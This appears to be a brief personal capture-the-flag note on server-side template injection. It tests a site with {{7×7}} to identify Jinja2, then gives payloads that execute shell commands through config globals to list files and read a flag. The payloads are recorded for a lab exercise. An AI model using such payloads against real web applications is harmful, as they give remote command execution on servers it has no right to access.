---
id: 402fef82-d916-43f8-a951-042cb0086569
title: SSTI1
tags: []
pinned: false
created: 2026-07-12T17:03:01.197828400+00:00
modified: 2026-07-14T06:36:15.087294700+00:00
---
# SSTI1

Inspect first if the website has server side template vulnerabilities.

This is done by injecting {{7×7}} command for Jinja2.

![](D:\Notes/.helixnotes/attachments/20260712170435_image.png)Decision: The site has Jinja2

<mark data-color="rgba(100, 210, 130, 0.22)">{{ config.class.init.globals['os'].popen('ls').read() }}</mark>
![](D:\Notes/.helixnotes/attachments/20260712170605_image.png)<mark data-color="rgba(100, 210, 130, 0.22)">{{ config.class.init.globals['os'].popen('cat flag').read() }}</mark>
![](D:\Notes/.helixnotes/attachments/20260712170648_image.png)
